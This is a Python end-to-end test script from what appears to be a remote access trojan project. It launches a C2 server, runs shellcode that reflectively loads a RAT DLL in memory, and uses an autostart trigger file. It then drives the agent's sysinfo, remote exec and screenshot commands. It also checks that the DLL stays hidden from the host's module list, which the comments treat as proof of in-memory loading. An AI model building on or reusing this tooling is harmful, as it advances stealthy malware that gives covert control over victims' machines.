# e2e_rdll.py — 反射加载(RfUdrl → runpic)验收
# 验证链路:Kali 上 `cpl link loader.spec RatAgent.dll out.bin` 产出的 PIC,由
#   runpic 宿主执行 → RfUdrl 在进程内反射加载内嵌的 RatAgent.dll(映射/重定位/
#   导入/TLS/异常目录)→ NtContinue 进 DllMain → autostart 触发器自启动 →
#   beacon 上线 → ratctl 交互(sessions/use/sysinfo/exec/screenshot)→
#   跨进程命名事件优雅停止(用磁盘 DLL 的 Stop 导出触发)。
# 前置(见 docs/PROGRESS.md「快速启动」):
#   build/e2e/out.bin             ← Kali: scp DLL 上去后 cpl link(见 docs/PROGRESS.md §8.5)
#   build/bin/c2server.exe / ratctl.exe
#   build/runpic/bin/runpic.exe    ← cmake -S tools/runpic -B build/runpic
#   build/dll/bin/RatAgent.dll     ← MSBuild RatAgentDll.vcxproj(Stop 导出用)
import os
import queue
import subprocess
import sys
import threading
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT_BIN = os.path.join(ROOT, "build", "e2e", "out.bin")
RUNPIC = os.path.join(ROOT, "build", "runpic", "bin", "runpic.exe")
C2 = os.path.join(ROOT, "build", "bin", "c2server.exe")
RATCTL = os.path.join(ROOT, "build", "bin", "ratctl.exe")
DLL = os.path.join(ROOT, "build", "dll", "bin", "RatAgent.dll")
WORK = os.path.join(ROOT, "build", "e2e")
AGENT_ID = os.path.join(WORK, "agent.id")
AGENT_LOG = os.path.join(WORK, "agent.log")
RUNPIC_LOG = os.path.join(WORK, "runpic.log")
C2_LOG = os.path.join(WORK, "c2server.log")
SHOT = os.path.join(WORK, "shot.jpg")
TRIGGER = None  # 运行时挑选(见 pick_trigger)

ok = True


def pick_trigger():
    """挑选可写的 autostart 触发器路径。

    agent 依次探测 %LOCALAPPDATA%\\RatAgent\\autostart.args → %TEMP%\\RatAgent\\
    autostart.args(见 client/core/agent_runtime.cpp)。受限沙箱里 LOCALAPPDATA 往往
    不可写,而 %TEMP% 被重定向到会话临时目录且子进程继承同一环境变量,故两者都试。
    """
    cands = []
    for env in ("LOCALAPPDATA", "TEMP", "TMP"):
        base = os.environ.get(env)
        if base:
            cands.append(os.path.join(base, "RatAgent", "autostart.args"))
    for c in cands:
        try:
            os.makedirs(os.path.dirname(c), exist_ok=True)
            with open(c, "a", encoding="utf-8"):
                pass
            os.remove(c)
            return c
        except OSError:
            continue
    return None


def check(name, cond, detail=""):
    global ok
    print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")
    if not cond:
        ok = False


def read_text(path, wait_s=0.0):
    """读取文本;先等 wait_s 让写入方落盘。文件不存在返回空串。"""
    if wait_s > 0:
        t0 = time.time()
        while time.time() - t0 < wait_s and not os.path.exists(path):
            time.sleep(0.2)
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return f.read()
    except OSError:
        return ""


class Shell:
    """交互式 ratctl 会话:stdin 发命令,读线程收集 stdout。"""

    def __init__(self):
        self.proc = subprocess.Popen([RATCTL, "-s", "127.0.0.1:4444"],
                                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT,
                                     encoding="utf-8", errors="replace", bufsize=1,
                                     cwd=ROOT)
        self.q = queue.Queue()
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        for line in self.proc.stdout:
            self.q.put(line)

    def drain(self):
        out = ""
        while True:
            try:
                out += self.q.get_nowait()
            except queue.Empty:
                break
        return out

    def send(self, cmds, wait):
        for c in cmds:
            self.proc.stdin.write(c + "\n")
            self.proc.stdin.flush()
        time.sleep(wait)
        return self.drain()

    def close(self):
        try:
            self.proc.stdin.close()
            self.proc.wait(timeout=3)
        except Exception:
            self.proc.kill()


def process_modules(pid):
    """用 EnumProcessModulesEx 列出进程已加载模块名。

    反射加载不会把 RatAgent.dll 挂进宿主模块表(它不在 loader 链表里),而
    LoadLibrary 会 —— 这是区分"反射加载"和"普通加载"的硬证据。
    枚举失败返回 None(检查降级为 warn,不影响结论)。
    """
    try:
        import ctypes
        from ctypes import wintypes

        PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, LIST_MODULES_ALL = 0x0400, 0x0010, 0x03
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        psapi = ctypes.WinDLL("psapi", use_last_error=True)
        # 必须声明 argtypes:否则 64 位 HMODULE 会按 32 位 int 转换而溢出
        k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        k32.OpenProcess.restype = wintypes.HANDLE
        k32.CloseHandle.argtypes = [wintypes.HANDLE]
        psapi.EnumProcessModulesEx.argtypes = [wintypes.HANDLE,
                                               ctypes.POINTER(wintypes.HMODULE),
                                               wintypes.DWORD,
                                               ctypes.POINTER(wintypes.DWORD),
                                               wintypes.DWORD]
        psapi.EnumProcessModulesEx.restype = wintypes.BOOL
        psapi.GetModuleBaseNameW.argtypes = [wintypes.HANDLE, wintypes.HMODULE,
                                             wintypes.LPWSTR, wintypes.DWORD]
        psapi.GetModuleBaseNameW.restype = wintypes.DWORD
        h = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
        if not h:
            return None
        try:
            arr = (wintypes.HMODULE * 2048)()
            need = wintypes.DWORD()
            if not psapi.EnumProcessModulesEx(h, arr, ctypes.sizeof(arr),
                                              ctypes.byref(need), LIST_MODULES_ALL):
                return None
            n = need.value // ctypes.sizeof(wintypes.HMODULE)
            names = []
            for i in range(n):
                buf = ctypes.create_unicode_buffer(260)
                if psapi.GetModuleBaseNameW(h, arr[i], buf, 260):
                    names.append(buf.value)
            return names
        finally:
            k32.CloseHandle(h)
    except Exception:
        return None


def main():
    global TRIGGER
    os.makedirs(WORK, exist_ok=True)

    # 0) 前置产物
    for p in (OUT_BIN, RUNPIC, C2, RATCTL, DLL):
        check(f"prereq {os.path.relpath(p, ROOT)}", os.path.exists(p))
    if not ok:
        print("== RESULT: PREREQ MISSING")
        sys.exit(1)

    # 0b) 触发器路径必须可写(LOCALAPPDATA 优先,TEMP 兜底)
    TRIGGER = pick_trigger()
    check("找到可写的 autostart 触发器位置", TRIGGER is not None,
          TRIGGER if TRIGGER else "no writable candidate")
    if TRIGGER is None:
        print("== RESULT: NO TRIGGER PATH")
        sys.exit(1)

    # 1) 清理旧状态(id/log/截屏/触发器)
    for f in (AGENT_ID, AGENT_LOG, RUNPIC_LOG, C2_LOG, SHOT, TRIGGER):
        if os.path.exists(f):
            os.remove(f)

    srv = None
    runpic = None
    sh = None
    try:
        # 2) C2 服务器(日志落盘)
        with open(C2_LOG, "w", encoding="utf-8", errors="replace") as f:
            srv = subprocess.Popen([C2], stdout=f, stderr=subprocess.STDOUT, cwd=ROOT)
        time.sleep(1)

        # 3) autostart 触发器:DllMain 检测到即在自建线程启动(内容 = 参数串)
        os.makedirs(os.path.dirname(TRIGGER), exist_ok=True)
        fwd = lambda p: p.replace(os.sep, "/")
        args = f"127.0.0.1,8080,-s,2,id={fwd(AGENT_ID)},log={fwd(AGENT_LOG)}"
        with open(TRIGGER, "w", encoding="utf-8") as f:
            f.write(args)

        # 4) runpic 执行 PIC(--hold -1 无限驻留)
        with open(RUNPIC_LOG, "w", encoding="utf-8", errors="replace") as f:
            runpic = subprocess.Popen([RUNPIC, OUT_BIN, "--hold", "-1"],
                                      stdout=f, stderr=subprocess.STDOUT, cwd=ROOT)

        # 5) 等 agent.id(反射加载 + 入口点 + 自启动完成的硬标志)
        t0 = time.time()
        while time.time() - t0 < 30 and not os.path.exists(AGENT_ID):
            time.sleep(0.5)
        check("agent.id 生成(反射加载+DllMain 自启动)", os.path.exists(AGENT_ID),
              f"{time.time() - t0:.1f}s")

        # 宿主输出与 DLL 输出可能落在不同文件:有控制台时 DLL 不做重定向、两者都走
        # 宿主 stdout;无控制台时 DLL 会 freopen 抢占 stdout、宿主后续输出也进日志。
        # 因此合并两边判断。
        def combined_text():
            return read_text(RUNPIC_LOG) + read_text(AGENT_LOG)

        t0 = time.time()
        while time.time() - t0 < 10:
            if "loader thread exited" in combined_text():
                break
            time.sleep(0.5)
        combined = combined_text()
        check("PIC 读入并映射", "pic mapped at" in combined, repr(combined[:160]))
        check("loader 线程完成(DllMain 经合成栈返回)", "loader thread exited" in combined,
              repr(combined[-160:]))

        t0 = time.time()
        while time.time() - t0 < 15:
            if "[beacon] started" in combined_text():
                break
            time.sleep(0.5)
        combined = combined_text()
        check("autostart 触发器命中", "autostart trigger" in combined)
        check("beacon 已启动", "[beacon] started" in combined,
              repr(combined[-160:]))

        # 反射加载 vs LoadLibrary 的硬证据:宿主模块表里没有 RatAgent.dll
        mods = process_modules(runpic.pid)
        if mods is not None:
            check("宿主模块表无 RatAgent.dll(确为反射加载)", "RatAgent.dll" not in mods,
                  f"modules={len(mods)}")
        else:
            print("[warn] 枚举宿主模块失败,跳过模块表检查")

        # 6) ratctl 交互(命令经 beacon GET 下发、结果经 POST 回传)
        sh = Shell()
        out1 = sh.send(["sessions"], 6)
        aid = ""
        for line in out1.splitlines():
            parts = line.split()
            if parts and len(parts[0]) == 32 and all(c in "0123456789abcdef" for c in parts[0]):
                aid = parts[0]
                break
        check("sessions 列出反射加载的 agent", len(aid) == 32, aid)

        out2 = sh.send(["use " + aid, "sysinfo"], 10)
        check("use 切换 + 提示符", "ratctl[" in out2 and "switched" in out2)
        check("sysinfo 回传", "OS:" in out2 and "HOST:" in out2, repr(out2[-100:]))

        marker = "rdll-reflective-ok"
        out3 = sh.send([f"exec echo {marker}"], 10)
        check("exec 回传", marker in out3, repr(out3[-100:]))

        out4 = sh.send([f"screenshot {aid} {fwd(SHOT)}"], 20)
        jpeg_ok = False
        if os.path.exists(SHOT):
            with open(SHOT, "rb") as f:
                head = f.read(2)
            jpeg_ok = head == b"\xff\xd8" and os.path.getsize(SHOT) > 1024
        check("screenshot 生成 JPEG", jpeg_ok,
              f"{os.path.getsize(SHOT)} bytes" if os.path.exists(SHOT) else "missing")
        sh.close()
        sh = None

        # 7) 跨进程优雅停止:磁盘 DLL 的 Stop 导出 → 命名事件 → 反射加载实例退出
        #    先删触发器:否则 rundll32 宿主的 DllMain 也会命中它、自己起一份 agent,
        #    Stop 就会走"同进程停止"分支,测不到跨进程命名事件这条路径。
        #    (反射加载的实例早已在启动时读过触发器,删掉不影响它继续运行)
        os.remove(TRIGGER)
        stop = subprocess.run(
            ["rundll32", f"{DLL},Stop", f"id={fwd(AGENT_ID)},log={fwd(AGENT_LOG)}"],
            capture_output=True, timeout=30)
        check("Stop 调用返回", stop.returncode == 0)
        t0 = time.time()
        while time.time() - t0 < 15:
            if "[beacon] stopped" in combined_text():
                break
            time.sleep(0.5)
        alog = combined_text()
        # rundll32 宿主无控制台 → Stop 的输出走 log= 指定的文件
        check("signalled 命中事件", "-> signalled" in alog)
        check("agent 优雅停止", "[beacon] stopped" in alog, repr(alog[-200:]))
    finally:
        # 8) 收尾:删触发器(关闭自启动)、杀宿主与服务器
        if sh:
            sh.close()
        try:
            if os.path.exists(TRIGGER):
                os.remove(TRIGGER)
        except OSError:
            pass
        if runpic:
            runpic.kill()
            runpic.wait(timeout=5)
        if srv:
            srv.terminate()
            try:
                srv.wait(timeout=5)
            except subprocess.TimeoutExpired:
                srv.kill()

    print("== RESULT:", "ALL PASS" if ok else "FAILURES PRESENT")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
